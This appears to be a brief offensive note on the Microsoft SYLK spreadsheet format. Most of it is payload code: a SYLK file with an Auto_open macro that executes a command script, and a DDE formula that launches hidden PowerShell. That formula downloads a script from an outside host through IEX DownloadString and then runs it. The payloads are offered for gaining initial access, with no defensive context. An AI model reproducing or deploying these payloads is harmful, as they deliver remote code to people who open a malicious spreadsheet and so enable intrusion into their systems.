# Symbolic link (SYLK)

`SYLK` is a Microsoft file format typically used to exchange data between applications, specifically spreadsheets. SYLK files conventionally have a .slk suffix

### Create paylod

```
ID;P
O;E
NN;NAuto_open;ER101C1;KOut Flank;F
C;X1;Y101;K0;EEXEC("E:\Initial-Access\Macro\screen.cmd")
C;X1;Y102;K0;EHALT()
E   
```

```
=cmd|'/c powershell.exe -w hidden IEX (New-Object Net.WebClient).DownloadString(\"http://nooranetred.com/screen.cmd\");start-process screen.cmd'!_xlbgnm.A1
```
